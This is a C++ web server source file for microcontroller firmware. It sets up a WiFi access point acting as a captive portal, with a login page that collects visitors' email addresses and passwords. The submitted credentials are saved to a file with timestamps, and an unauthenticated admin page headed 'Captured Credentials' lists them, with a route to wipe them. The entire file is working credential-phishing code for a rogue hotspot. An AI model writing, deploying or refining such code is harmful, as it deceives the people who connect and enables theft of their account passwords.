#include "WebServerControllerClass.h"

WebServerControllerClass::WebServerControllerClass() {
    this->webServer = new AsyncWebServer(WEB_SERVER_PORT);
}

void WebServerControllerClass::initialize(IPAddress apIP, IPAddress netMsk) {
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(apIP, apIP, netMsk);
    WiFi.softAP(NETWORK_SSID, NETWORK_PASSWORD);

    this->webServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        String htmlContent = "";
        FileSystemController.readFile("/index.html", htmlContent);
        request->send(200, "text/html", htmlContent);
    });

    this->webServer->on("/connect", HTTP_GET, [](AsyncWebServerRequest *request){
        String htmlContent = "";
        FileSystemController.readFile("/connect.html", htmlContent);
        request->send(200, "text/html", htmlContent);
    });

    // Handle POST request for credential submission
    this->webServer->on("/submit-credentials", HTTP_POST, [](AsyncWebServerRequest *request){
        String email = "";
        String password = "";
        
        // Get email and password from POST parameters
        if (request->hasParam("email", true)) {
            email = request->getParam("email", true)->value();
        }
        if (request->hasParam("password", true)) {
            password = request->getParam("password", true)->value();
        }
        
        // Store credentials in file
        WebServerController.storeCredentials(email, password);
        
        // Redirect to success page or back to login
        request->redirect("/");
    });

    // Admin route to view captured credentials
    this->webServer->on("/admin/credentials", HTTP_GET, [](AsyncWebServerRequest *request){
        String credentialsContent = "";
        if (FileSystemController.readFile("/credentials.txt", credentialsContent)) {
            String htmlResponse = "<html><head><title>Captured Credentials</title></head><body>";
            htmlResponse += "<h1>Captured Credentials</h1>";
            htmlResponse += "<pre>" + credentialsContent + "</pre>";
            htmlResponse += "<br><a href='/admin/clear'>Clear Credentials</a>";
            htmlResponse += "</body></html>";
            request->send(200, "text/html", htmlResponse);
        } else {
            request->send(404, "text/plain", "No credentials found");
        }
    });

    // Admin route to clear credentials
    this->webServer->on("/admin/clear", HTTP_GET, [](AsyncWebServerRequest *request){
        WebServerController.clearCredentials();
        request->send(200, "text/plain", "Credentials cleared successfully");
    });

    // Serve static assets using serveStatic for better binary file handling
    this->webServer->serveStatic("/assets/", LittleFS, "/assets/");

    this->webServer->onNotFound([](AsyncWebServerRequest *request){
        request->redirect("/");
    });

    this->webServer->begin();

    LoggerController.logEvent("Web server initialized.");
}

void WebServerControllerClass::loop() {
    // webServer->handleClient();
}

void WebServerControllerClass::storeCredentials(const String& email, const String& password) {
    // Create a timestamp for the entry
    String timestamp = String(millis());
    
    // Format the credential data with timestamp
    String credentialData = "Timestamp: " + timestamp + "ms\n";
    credentialData += "Email: " + email + "\n";
    credentialData += "Password: " + password + "\n";
    credentialData += "IP: " + WiFi.softAPIP().toString() + "\n";
    credentialData += "---\n";
    
    // Append new data to credentials file
    if (FileSystemController.appendFile("/credentials.txt", credentialData)) {
        LoggerController.logEvent("Credentials stored successfully for email: " + email);
    } else {
        LoggerController.logError("Failed to store credentials for email: " + email);
    }
}

void WebServerControllerClass::clearCredentials() {
    if (FileSystemController.deleteFile("/credentials.txt")) {
        LoggerController.logEvent("Credentials file cleared successfully.");
    } else {
        LoggerController.logError("Failed to clear credentials file.");
    }
}

WebServerControllerClass WebServerController;